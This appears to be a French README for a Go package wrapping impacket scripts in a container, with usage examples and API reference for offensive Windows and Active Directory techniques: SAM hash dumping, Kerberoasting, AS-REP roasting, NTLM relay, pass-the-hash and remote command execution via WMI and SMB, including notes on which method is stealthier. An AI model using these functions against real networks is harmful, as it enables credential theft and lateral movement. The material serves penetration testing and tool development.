# tools/impacket

Wrappers Go types pour les scripts Python impacket, executes dans un container Podman ARM64.

## Package independant

Ce package ne depend que de `tools/containers` (aucune autre dependance interne au projet).
Toutes les invocations reseau passent par le container — aucune bibliotheque Python n'est
requise sur l'hote.

## Exemple simple

Dumper les hashes SAM d'un hote Windows.

```go
imp := impacket.New() // charge l'image depuis /usr/share/oioni/impacket-arm64.tar.gz

creds, err := imp.SecretsDump(ctx, "dump-1", impacket.SecretsDumpConfig{
    Target:   "192.168.1.10",
    Username: "Administrator",
    Password: "Password1",
})
if err != nil {
    log.Fatal(err)
}
for _, c := range creds {
    fmt.Printf("%s : %s\n", c.Username, c.Hash)
}
```

## Exemple avance

Kerberoasting + relay NTLM en parallele avec injection d'un manager de test.

```go
// Production : New() avec image personnalisee (environnement de dev).
imp := impacket.New(impacket.WithLocalImage("/tmp/impacket-arm64.tar.gz"))

// Kerberoasting : recupere les TGS-REP pour tous les comptes de service.
hashes, err := imp.Kerberoast(ctx, "kb-1", impacket.KerberoastConfig{
    Target:   "dc01.corp.local",
    Domain:   "corp.local",
    Username: "jsmith",
    Password: "Summer2024!",
})
for _, h := range hashes {
    fmt.Printf("[TGS] %s\\%s  SPN=%s\n", h.Domain, h.Username, h.SPN)
    fmt.Println(h.Hash) // blob $krb5tgs$... a passer a hashcat
}

// NTLM relay daemon (processus long-running).
relay, err := imp.NTLMRelay(ctx, "relay-1", impacket.NTLMRelayConfig{
    Target:      "smb://192.168.1.10",
    SMB2Support: true,
})
if err != nil {
    log.Fatal(err)
}
// Lire les captures en temps reel.
go func() {
    for evt := range relay.Events() {
        fmt.Printf("[RELAY] %s\\%s -> %s\n", evt.Domain, evt.Username, evt.Target)
    }
}()

// Arreter proprement le daemon.
stopCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
defer cancel()
_ = relay.Stop(stopCtx)

// ---------------------------------------------------------------
// Tests : injecter un ProcessStarter factice sans Podman.
// ---------------------------------------------------------------
type fakeStarter struct{}

func (f *fakeStarter) Start(_ context.Context, name, _ string, _ []string) (*containers.Process, error) {
    ch := make(chan string, 1)
    ch <- "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::"
    close(ch)
    return containers.NewProcess(ch, func() error { return nil }, func() error { return nil }), nil
}
func (f *fakeStarter) Stop(_ context.Context, _ string) error { return nil }
func (f *fakeStarter) Kill(_ string) error                    { return nil }

imp := impacket.NewWithManager(&fakeStarter{})
creds, _ := imp.SecretsDump(ctx, "t", impacket.SecretsDumpConfig{Target: "x", Username: "u"})
fmt.Println(creds[0].Username) // "Administrator"
```

## Points d'attention

**Premier demarrage ~75s**
`impacket.New()` ne demarre pas le container a la construction — il est initialise lors
du premier appel a un outil. Ce premier appel charge l'image via `podman load` (~75s).
Les appels suivants (meme apres redemarrage du processus Go) sont instantanes si l'image
est deja presente dans le store Podman.

**Image livree via ExtraFilePaths**
L'image ARM64 est construite depuis `tools/impacket/Dockerfile` (python:3.13-alpine +
impacket 0.12.0) et exportee en `.tar.gz` (~40 MiB compresse, ~125 MiB decompresse).
Sur gokrazy elle est livree via `ExtraFilePaths` dans `config.json` et placee dans
`/usr/share/oioni/impacket-arm64.tar.gz` — chemin par defaut de `New()`.

**Nommage des processus**
Chaque appel a un outil prend un parametre `name` qui identifie le processus dans le
registry de `ProcManager`. Il doit etre unique parmi les processus en cours.
Les outils synchrones (SecretsDump, Kerberoast, etc.) liberent le slot a leur retour.
Les outils asynchrones (NTLMRelay, Exec sans commande) le liberent a l'arret du daemon.

**Pass-the-hash**
Tous les outils acceptent un champ `Hash` au format `LMHASH:NTHASH` en remplacement du
mot de passe. Si `Hash` est renseigne, `Password` est ignore.
Pour un LM hash vide : `aad3b435b51404eeaad3b435b51404ee:<nthash>`.

**NTLMRelay : daemon long-running**
`NTLMRelay()` retourne immediatement un `*NTLMRelayProcess`. Le daemon tourne jusqu'a
`relay.Stop()` ou `relay.Kill()`. Ne pas oublier de l'arreter explicitement ; `Close()`
sur le manager sous-jacent le tuerait egalement, mais n'est pas expose directement par
`Impacket`.

**Exec sans commande = shell interactif**
Si `ExecConfig.Command` est vide, `Exec()` ouvre un shell interactif.
`Lines()` diffuse la sortie du shell ; envoyer des commandes n'est pas supporte
(pas d'acces au stdin du processus). Utiliser `Run()` pour un usage avance.

**Sortie brute via Run()**
`Run()` lance n'importe quel script impacket sans parsing. Le caller lit `proc.Lines()`
directement. Utile pour des outils non encore encapsules (GetADUsers.py, etc.).

## Reference API

### Constructeurs

```go
// Manager reel — charge l'image depuis /usr/share/oioni/impacket-arm64.tar.gz.
func New(opts ...ImpacketOption) *Impacket

// Surcharger le chemin de l'image (dev / CI).
func WithLocalImage(path string) ImpacketOption

// Injecter un ProcessStarter personnalise (tests).
func NewWithManager(mgr ProcessStarter) *Impacket
```

### Interface ProcessStarter

```go
type ProcessStarter interface {
    Start(ctx context.Context, name, executable string, args []string) (*containers.Process, error)
    Stop(ctx context.Context, name string) error
    Kill(name string) error
}
```

`*containers.ProcManager` satisfait cette interface. Les fakes de test implementent
les trois methodes ; `Stop` et `Kill` peuvent etre des no-ops si le test ne les exercice pas.

### Outils synchrones

Tous bloquent jusqu'a la fin de l'outil et retournent des types Go structures.
Ils respectent l'annulation du contexte : le processus est tue et l'erreur du contexte
est retournee.

#### SecretsDump

```go
func (i *Impacket) SecretsDump(ctx context.Context, name string, cfg SecretsDumpConfig) ([]Credential, error)

type SecretsDumpConfig struct {
    Target   string // IP ou hostname, obligatoire
    Username string
    Password string // ou Hash
    Hash     string // pass-the-hash : LMHASH:NTHASH
    Domain   string // optionnel
}

type Credential struct {
    Username string
    Domain   string
    Hash     string // "LMHASH:NTHASH"
    Type     string // "NTLM"
}
```

#### Kerberoast / ASREPRoast

```go
func (i *Impacket) Kerberoast(ctx context.Context, name string, cfg KerberoastConfig) ([]KerberosHash, error)
func (i *Impacket) ASREPRoast(ctx context.Context, name string, cfg ASREPRoastConfig) ([]KerberosHash, error)

type KerberoastConfig struct {
    Target   string // IP ou hostname du DC, obligatoire
    Domain   string // obligatoire
    Username string
    Password string
    Hash     string
}

type ASREPRoastConfig struct {
    Target   string // IP ou hostname du DC, obligatoire
    Domain   string // obligatoire
    Username string // optionnel : si vide, tous les comptes vulnerables sont testes
    Password string
    Hash     string
}

type KerberosHash struct {
    Username string
    Domain   string
    SPN      string // non vide pour TGS-REP (Kerberoast) ; vide pour AS-REP
    Hash     string // blob complet $krb5tgs$... ou $krb5asrep$...
}
```

#### LookupSID

```go
func (i *Impacket) LookupSID(ctx context.Context, name string, cfg SIDLookupConfig) ([]DomainObject, error)

type SIDLookupConfig struct {
    Target   string // obligatoire
    Username string
    Password string
    Hash     string
    Domain   string // optionnel
    MaxRID   int    // brute-force jusqu'a ce RID (defaut : 4000)
}

type DomainObject struct {
    RID    int    // ex. 500 pour Administrator
    Domain string // nom NetBIOS, ex. "WORKGROUP"
    Name   string // ex. "Administrator", "Domain Admins"
    Type   string // "SidTypeUser", "SidTypeGroup", "SidTypeAlias", ...
}
```

#### SAMRDump

```go
func (i *Impacket) SAMRDump(ctx context.Context, name string, cfg SAMRDumpConfig) ([]SAMUser, error)

type SAMRDumpConfig struct {
    Target   string // obligatoire
    Username string
    Password string
    Hash     string
    Domain   string // optionnel
}

type SAMUser struct {
    Username string
    UID      int // RID mappe en style Unix
}
```

### Outils asynchrones

#### NTLMRelay

```go
func (i *Impacket) NTLMRelay(ctx context.Context, name string, cfg NTLMRelayConfig) (*NTLMRelayProcess, error)

type NTLMRelayConfig struct {
    Target      string // cible du relay, ex. "smb://192.168.1.1"
    SMB2Support bool   // active -smb2support
    OutputFile  string // optionnel : -of <fichier>
}

// NTLMRelayProcess — ne pas copier.
func (p *NTLMRelayProcess) Process() *containers.Process  // acces au Process sous-jacent
func (p *NTLMRelayProcess) Events() <-chan NTLMRelayEvent  // capacite 16 ; ferme a la fin
func (p *NTLMRelayProcess) Err() error                    // erreur de sortie ; nil pendant l'execution
func (p *NTLMRelayProcess) Stop(ctx context.Context) error
func (p *NTLMRelayProcess) Kill() error

type NTLMRelayEvent struct {
    Username string
    Domain   string
    Hash     string // ligne NTLMv2 complete
    Target   string
}
```

#### Exec

```go
func (i *Impacket) Exec(ctx context.Context, name string, cfg ExecConfig) (*containers.Process, error)

type ExecConfig struct {
    Target   string     // obligatoire
    Username string
    Password string
    Hash     string
    Domain   string     // optionnel
    Command  string     // si vide : shell interactif
    Method   ExecMethod // ExecWMI (defaut), ExecSMB, ExecSMBExec
}

const (
    ExecWMI     ExecMethod = "wmi"     // wmiexec.py — semi-discret, pas d'installation de service
    ExecSMB     ExecMethod = "smb"     // psexec.py  — bruyant, cree un service
    ExecSMBExec ExecMethod = "smbexec" // smbexec.py — SMB + cmd.exe, pas d'upload binaire
)
```

### Acces brut

```go
// Lance n'importe quel script impacket avec des arguments bruts.
// Retourne un *containers.Process ; le caller lit Lines() directement.
func (i *Impacket) Run(ctx context.Context, name, tool string, args []string) (*containers.Process, error)
```
